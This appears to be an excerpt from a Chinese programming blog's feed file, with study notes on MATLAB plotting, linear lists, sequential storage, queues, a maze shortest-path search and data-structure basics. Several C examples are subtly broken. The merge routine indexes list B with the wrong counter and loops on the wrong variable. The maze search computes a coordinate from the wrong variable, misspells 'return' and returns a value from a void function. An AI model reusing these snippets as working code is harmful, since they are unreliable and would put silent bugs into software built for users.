punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>Y<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>Z<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'Z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'X,Y,Z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>成品图如下</code>：</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbafba7df128.png" alt=""></div>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数模 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数据结构和算法-day2</title>
      <link href="/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day2/"/>
      <url>/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day2/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="数据结构和算法-（Algorithm）-线性结构"><a href="#数据结构和算法-（Algorithm）-线性结构" class="headerlink" title="数据结构和算法 （Algorithm）- 线性结构"></a>数据结构和算法 （Algorithm）- 线性结构</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; 线性结构的基本特征是：在数据元素的非空有限集中，有且仅有一个元素没有前驱，有且仅有一个数据元素没有后继；其余数据元素有且仅有只有一个直接的前驱和后继。</p><pre class=" language-c"><code class="language-c">例如<span class="token punctuation">:</span>   <span class="token operator">*</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">*</span></code></pre><h2 id="线性表"><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h2><p> &nbsp; &nbsp; &nbsp; 线性表是由同一类型的数据元素构成的线性结构，特点是：数据元素间呈一种线性关系。线性表是具有相同数据类型的n个数据元素的有限序列，通常记为：</p><p>（a1，a2，a3，······，a(i-1)，ai，a(i+1)，······，an）</p><p><code>线性表抽象数据类型</code>：</p><pre class=" language-c"><code class="language-c">ADT List<span class="token punctuation">{</span>数据对象<span class="token punctuation">:</span> D<span class="token operator">=</span><span class="token punctuation">{</span>ai<span class="token operator">|</span> <span class="token function">ai</span><span class="token punctuation">(</span><span class="token operator">-</span>ElemSet<span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>n<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">}</span>数据关系<span class="token punctuation">:</span> R1<span class="token operator">=</span><span class="token punctuation">{</span>i<span class="token number">-1</span><span class="token punctuation">,</span>ai<span class="token operator">></span><span class="token operator">|</span> ai<span class="token number">-1</span><span class="token punctuation">,</span><span class="token function">ai</span><span class="token punctuation">(</span><span class="token operator">-</span> D<span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>n<span class="token punctuation">}</span>基本操作：<span class="token function">InitList</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">)</span>          <span class="token comment" spellcheck="true">//初始化</span><span class="token function">DestroyList</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">//删除</span><span class="token function">ListInsert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">,</span>i<span class="token punctuation">,</span>e<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//插入</span><span class="token function">ListDelete</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>L<span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token operator">&amp;</span>e<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//删除指定元素</span><span class="token punctuation">}</span>ADT List</code></pre><p>线性表有两种存储结构：</p><p> &nbsp; &nbsp; &nbsp; ①定长的顺序存储结构——向量型的一维数组结构</p><p> &nbsp; &nbsp; &nbsp; ②变长的线性表存储结构——链接式存储结构，动态数组，顺序文件</p><h3 id="线性表的顺序存储以及运算实现"><a href="#线性表的顺序存储以及运算实现" class="headerlink" title="线性表的顺序存储以及运算实现"></a>线性表的顺序存储以及运算实现</h3><p> &nbsp; &nbsp; &nbsp; 众人皆知的数组，其实就是以顺序结构存储数据的线性表。</p><blockquote><p> 顺序表示例图：</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/09/5bbbfe6d21e6a.png" alt=""><br><br></div><blockquote><p>顺序表结构算法：</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> MAXSIZE 20           </span><span class="token comment" spellcheck="true">// 顺序表的最大存储容量</span><span class="token keyword">typedef</span> <span class="token keyword">int</span> datatype<span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// 顺序表存储的数据类型</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    datatype data<span class="token punctuation">[</span>MAXSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//线性表存储数据</span>    <span class="token keyword">int</span> Last<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//线性表的长度</span><span class="token punctuation">}</span>SeqList<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//定义一个顺序表 SeqList L;</span><span class="token comment" spellcheck="true">//定义一个SeqList类型的指针 SeqList *L;</span>SeqList <span class="token operator">*</span> <span class="token function">init_SeqList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//初始化线性表</span>    SeqList <span class="token operator">*</span>L<span class="token punctuation">;</span>    L <span class="token operator">=</span> <span class="token punctuation">(</span>SeqList <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>SeqList<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    L<span class="token operator">-></span>Last<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> L<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    SeqList <span class="token operator">*</span>L <span class="token operator">=</span> <span class="token function">init_SeqList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        L<span class="token operator">-></span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>        L<span class="token operator">-></span>Last <span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"当前顺序表的长度为 %d，顺序表的大小为 %d"</span><span class="token punctuation">,</span>L<span class="token operator">-></span>Last<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>L<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p> &nbsp; &nbsp; &nbsp; 顺序表应用举例：有顺序表A，B，其元素均按从小到大的升序排列，编写一个算法将他们合并成一个顺序表C，要求C的元素也是从小到大的升序排列。</p><p> &nbsp; &nbsp; &nbsp; 算法思路：依次扫描A和B中的元素，比较当前元素的值，将较小值的元素赋给C，直到一个线性表扫描完毕之后将未完的那个顺序表中余下的那部分赋给C，且C的容量需要能够容纳A,B两个线性表相加的长度，<strong>算法如下</strong>：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">merge</span><span class="token punctuation">(</span>SeqList A<span class="token punctuation">,</span>SeqList B<span class="token punctuation">,</span>SeqList <span class="token operator">*</span>c<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">;</span>    i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>A<span class="token punctuation">.</span>last<span class="token operator">&amp;&amp;</span>j<span class="token operator">&lt;=</span>B<span class="token punctuation">.</span>last<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span>B<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>A<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>B<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>A<span class="token punctuation">.</span>last<span class="token punctuation">)</span>        C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>A<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>B<span class="token punctuation">.</span>last<span class="token punctuation">)</span>        C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>B<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    C<span class="token operator">-></span>last<span class="token operator">=</span>k<span class="token number">-1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><blockquote><p>顺序表的优缺点：</p><p>线性表的顺序存储结构，在存、读取数据时，不管是在哪个位置，时间复杂度都是O(1)。而在插入或者删除时，时间复杂度都是O(n)。</p><p>这也就是线性表的顺序存储结构比较适合存取数据，不适合经常插入和删除数据的应用。</p><p>优点：</p><p>1.无需为了表示表中元素之间的逻辑关系而增加额外的存储空间（相对于链式存储而言）。</p><p>2.可以快速的存取表中任意位置的元素。</p><p>缺点：</p><p>1.插入和删除操作需要移动大量的元素。</p><p>2.当线性表长度变化较大时，难以确定存储空间的容量。</p><p>3.容易造成存储空间的“碎片”(因为线性表的顺序存储结构申请的内存空间都以连续的，如果因为某些操作（比如删除操作）导致某个部分出现了一小块的不连续内存空间，因为这一小块内存空间太小不能够再次被利用/分配，那么就造成了内存浪费，也就是“碎片”)</p><p>参考 <a href="https://www.cnblogs.com/wsnb/p/5191518.html" target="_blank" rel="noopener">https://www.cnblogs.com/wsnb/p/5191518.html</a></p></blockquote><h3 id="线性表的链式存储和运算实现"><a href="#线性表的链式存储和运算实现" class="headerlink" title="线性表的链式存储和运算实现"></a>线性表的链式存储和运算实现</h3><p> &nbsp; &nbsp; &nbsp; 顺序表最大的缺点是移动数据元素需要耗费许多时间，影响操作效率。正是因为顺序表的特性，相邻两元素之间的数据存在相邻的关系，使得插入删除的操作麻烦了许多。</p><p> &nbsp; &nbsp; &nbsp; 而链式存储方法不需要用地址连续的存储单元来实现，从而可以使得逻辑相邻的两数据元素在物理上不相邻，但有优点就有缺点，链式存储方法不能进行随机存取。</p><p> &nbsp; &nbsp; &nbsp; 而链表又有单链表，循环链表，双向链表，静态链表的区别。</p><h2 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h2><blockquote><p>队列是一种操作受限的线性数据结构，与栈后进先出(LIFO)的数据结构截然不同的是队列是一种“先进先出”（FIFO）的数据结构。将这种插入在表一端进行，而删除在表另一端进行的数据结构称为队列（Queue)，并允许插入的一端为队尾（Rear），允许删除的一端为队首（Front）。</p><p><img src="https://i.loli.net/2018/10/16/5bc53818b751c.png" alt=""></p><p>队列的抽象数据类型如下：</p><pre><code>ADT Queue{数据对象：D={ai|ai∈ElemSet, i=1,2, …,n, n≥0}数据关系：R1={&lt;ai-1,ai&gt;|ai-1,ai∈D, i=1,2, …,n }            约定a1为队列头，an为队列尾。基本操作：    InitQueue( &amp;Q ):      操作结果：构造一个空队列Q。    DestroyQueue ( &amp;Q ):      初始条件：队列Q已存在。      操作结果：销毁队列Q。    ClearQueue ( &amp;Q ):      初始条件：队列Q已存在。      操作结果：将Q清为空队列。    QueueEmpty( Q ):      初始条件：队列Q已存在。      操作结果：若Q为空队列，则返回TRUE，否则返回FALSE。    QueueLength( Q ):      初始条件：队列Q已存在。      操作结果：返回Q的数据元素个数，即队列的长度。    GetHead( Q, &amp;e ):      初始条件：队列Q已存在且非空。      操作结果：用e返回Q的队头元素。    EnQueue( &amp;Q, e ):      初始条件：队列Q已存在。      操作结果：插入元素e为Q的新的队尾元素。    DeQueue( &amp;Q, &amp;e ):      初始条件：队列Q已存在且非空。      操作结果：删除Q的队头元素，并用e返回其值。}ADT Queue</code></pre></blockquote><h3 id="基于队列的算法设计实例"><a href="#基于队列的算法设计实例" class="headerlink" title="基于队列的算法设计实例"></a>基于队列的算法设计实例</h3><blockquote><p>​    求迷宫的最短路径：现要求设计一个算法找一条从迷宫入口到出口的最短路径。</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//队的定义</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> x<span class="token punctuation">,</span>y<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//记录坐标</span>    <span class="token keyword">int</span> pre<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//pre作为前驱点在sq中的坐标</span><span class="token punctuation">}</span>sqtype<span class="token punctuation">;</span>sqtype sq<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> front<span class="token punctuation">,</span>rear<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//定义头尾</span><span class="token comment" spellcheck="true">//算法如下：</span><span class="token keyword">void</span> <span class="token function">path</span><span class="token punctuation">(</span>maze<span class="token punctuation">,</span>move<span class="token punctuation">)</span>    <span class="token keyword">int</span> maze<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//迷宫数组</span>    item move<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//坐标增量数组</span><span class="token punctuation">{</span>    sqtype sq<span class="token punctuation">[</span>NUM<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> front<span class="token punctuation">,</span>rear<span class="token punctuation">;</span>    <span class="token keyword">int</span> x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>v<span class="token punctuation">;</span>    front <span class="token operator">=</span> rear <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    sq<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> sq<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>y <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>sql<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pre<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    maze<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>front<span class="token operator">&lt;=</span>rear<span class="token punctuation">)</span><span class="token punctuation">{</span>        x <span class="token operator">=</span> sq<span class="token punctuation">[</span>front<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span>y<span class="token operator">=</span>sq<span class="token punctuation">[</span>front<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>v<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>v<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>v<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//探测八个方向的路径</span>            i <span class="token operator">=</span> x<span class="token operator">+</span>move<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span> j<span class="token operator">=</span>x<span class="token operator">+</span>move<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>maze<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                rear<span class="token operator">++</span><span class="token punctuation">;</span>                sq<span class="token punctuation">[</span>rear<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span> i<span class="token punctuation">;</span>                sq<span class="token punctuation">[</span>rear<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token operator">=</span>j<span class="token punctuation">;</span>                sq<span class="token punctuation">[</span>rear<span class="token punctuation">]</span><span class="token punctuation">.</span>pre<span class="token operator">=</span>front<span class="token punctuation">;</span>                maze<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//走过的路置-1</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span>m<span class="token operator">&amp;&amp;</span>j<span class="token operator">==</span>m<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">printpath</span><span class="token punctuation">(</span>sq<span class="token punctuation">,</span>rear<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//打印迷宫</span>                  <span class="token function">restore</span><span class="token punctuation">(</span>maze<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//恢复迷宫，此处未写该函数</span>                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        front<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    retrun <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//打印迷宫的函数</span><span class="token keyword">void</span> <span class="token function">printpath</span><span class="token punctuation">(</span>sqtype sq<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> rear<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    i <span class="token operator">=</span> rear<span class="token punctuation">;</span>    <span class="token keyword">do</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"(%d,%d)&lt;--"</span><span class="token punctuation">,</span>sq<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">,</span>sq<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>        i <span class="token operator">=</span> sq<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pre<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="https://i.loli.net/2018/10/16/5bc543e6329ce.png" alt=""></p><p>​    循环队列是队列的一种，就像一个首尾相连的贪吃蛇，一直转圈，超过一定长度，就会吃到自己的尾巴。    </p><p>​    如果有需要使用存储信息的队列，不建议使用循环队列，因为循环队列一旦超出定义的大小，就会对之前存储的信息发生覆盖（发生假溢出）。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>数据结构和算法-day1</title>
      <link href="/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day1/"/>
      <url>/2018/10/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95-day1/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="数据结构和算法-（Algorithm）-绪论"><a href="#数据结构和算法-（Algorithm）-绪论" class="headerlink" title="数据结构和算法 （Algorithm）- 绪论"></a>数据结构和算法 （Algorithm）- 绪论</h1><h2 id="数据是个啥？"><a href="#数据是个啥？" class="headerlink" title="数据是个啥？"></a>数据是个啥？</h2><p> &nbsp; &nbsp; &nbsp; 数据（data）是信息的载体，是对客观事物的符号化表示，它的含义极为广泛，包含了人们日穿生活中的各种信息在计算机内的表示，而<strong>数据元素</strong>则是数据的基本单位。</p><p><img src="http://photo.orsoon.com/JPG-180515/180515_42/k5oFKYNsQz_small.jpg" alt=""></p><h2 id="数据结构定义"><a href="#数据结构定义" class="headerlink" title="数据结构定义"></a>数据结构定义</h2><p>&nbsp; &nbsp; &nbsp; &nbsp; 数据结构分为逻辑结构和物理结构，以及数据运算三方面内容，一起来愉快地学习它吧😭！</p><h3 id="逻辑结构中几种结构的基本定义"><a href="#逻辑结构中几种结构的基本定义" class="headerlink" title="逻辑结构中几种结构的基本定义"></a>逻辑结构中几种结构的基本定义</h3><p>① 线性结构(1:1)：结构中的数据元素之间存在着一对一的关系，如表，栈，队列等。</p><p>② 树形结构(1:n)：结构中的数据元素之间存在着一对多的关系。</p><p>③ 图形结构(m:n)：结构中的数据元素之间存在着多对多的关系，图形结构也被称为网状结构。</p><p>④ 集合结构：集合结构中的数据元素之间的关系仅仅是”属于同一个集合”，这种结构中的元素关系极为松散，该结构较为少见。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 总体来说，根据数据元素之间存在的不同关系，数据结构可分为<strong>线性结构和非线性结构😱</strong>。</p><p><img src="https://i.loli.net/2018/10/07/5bb97795e5dd5.png" alt=""></p><h3 id="数据结构中的物理结构"><a href="#数据结构中的物理结构" class="headerlink" title="数据结构中的物理结构"></a>数据结构中的物理结构</h3><p>&nbsp; &nbsp; &nbsp; &nbsp; 数据的逻辑结构和数据的存储无关，对数据的操作主要依赖数据的存储，而数据在计算机中的存储表示即数据的存储结构可分为<strong>顺序存储</strong>和<strong>非顺序存储</strong>，但针对一些特殊应用，还有<strong>索引存储结构，散列存储（hash方法）结构</strong>等其他表示方法。</p><p>① <strong>顺序存储方法</strong>：把逻辑上相邻的数据元素储存在物理位置上也相邻的存储单元中，例如数组即是顺序存储方法。</p><p>② <strong>链式存储方法</strong>：逻辑上相邻的数组元素不要求其在物理位置上也相邻，通过附设的指针字段值来指示数据的逻辑关系，算法中的指针就是由链式存储结构实现的。</p><p>③ 索引存储方法：除建立存储结点信息外，还建立附加的索引表来标识结点的地址，索引表由若干索引项组成。 <strong>Dense Index（稠密索引）</strong>代表每个数据元素在索引表中均有一个索引项。<strong>Sparse Index（稀疏索引）</strong>，代表一个索引项对应一组数据元素，<a href="https://www.cnblogs.com/FreeFire/p/4329528.html" target="_blank" rel="noopener">参考链接</a>。</p><p>④ 散列存储方法（Hash方法）：散列是数组存储方式的一种发展，相比数组，散列的数据访问速度要高于数组，因为可以依据存储数据的部分内容找到数据在数组中的存储位置，进而能够快速实现数据的访问，理想的散列访问速度是非常迅速的，而不像在数组中的遍历过程，采用存储数组中内容的部分元素作为映射函数的输入，映射函数的输出就是存储数据的位置，这样的访问速度就省去了遍历数组的实现，因此<strong>时间复杂度可以认为为O(1)</strong>，而<strong>数组遍历的时间复杂度为O(n)</strong>，<a href="https://baike.baidu.com/item/%E6%95%A3%E5%88%97%E5%AD%98%E5%82%A8%E6%96%B9%E6%B3%95/9663463?fr=aladdin" target="_blank" rel="noopener">参考链接</a>。</p><h2 id="抽象数据类型（Abstract-Data-Type，ADT）"><a href="#抽象数据类型（Abstract-Data-Type，ADT）" class="headerlink" title="抽象数据类型（Abstract Data Type，ADT）"></a>抽象数据类型（Abstract Data Type，ADT）</h2><p> &nbsp; &nbsp; &nbsp; ADT 的定义：一个数学模型以及定义在该模型上的一组操作。描述数据结构的一种理论工具。</p><pre class=" language-bash"><code class="language-bash">ADT 抽象数据类型名称 <span class="token punctuation">{</span>数据对象：<span class="token operator">&lt;</span>数据对象定义<span class="token operator">></span>……数据关系：<span class="token operator">&lt;</span>逻辑关系定义<span class="token operator">></span>……操作集合：  操作名1：  <span class="token operator">&lt;</span>基本操作1初始条件描述<span class="token operator">></span>  <span class="token operator">&lt;</span>基本操作1操作结果描述<span class="token operator">></span>  ……  ……  操作名n：  <span class="token operator">&lt;</span>基本操作n初始条件描述<span class="token operator">></span>  <span class="token operator">&lt;</span>基本操作n操作结果描述<span class="token operator">></span><span class="token punctuation">}</span>ADT抽象数据类型名称</code></pre><p> &nbsp; &nbsp; &nbsp; ADT 的作用：抽象数据类型可以使我们更容易描述现实世界。例：用线性表描述学生成绩表，用树或图描述遗传关系。<strong>优点是拥有较强的重复性，灵活性，封装性。</strong></p><p> &nbsp; &nbsp; &nbsp; ADT 的关键特征：使用它的人可以只关心它的逻辑特征，不需要了解它的存储方式。定义它的人同样不必要关心它如何存储。</p><p> &nbsp; &nbsp; &nbsp; 例如：线性表这样的抽象数据类型，其数学模型是：<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%85%83%E7%B4%A0" target="_blank" rel="noopener">数据元素</a>的集合，该集合内的元素有这样的关系：除第一个和最后一个外，每个元素有唯一的前趋和唯一的后继。可以有这样一些操作：插入一个元素、删除一个元素等。</p><p> &nbsp; &nbsp; &nbsp; <strong>从抽象数据类型的角度看，数据结构是ADT的物理实现。</strong></p><h2 id="算法的复杂度"><a href="#算法的复杂度" class="headerlink" title="算法的复杂度"></a>算法的复杂度</h2><p> &nbsp; &nbsp; &nbsp; 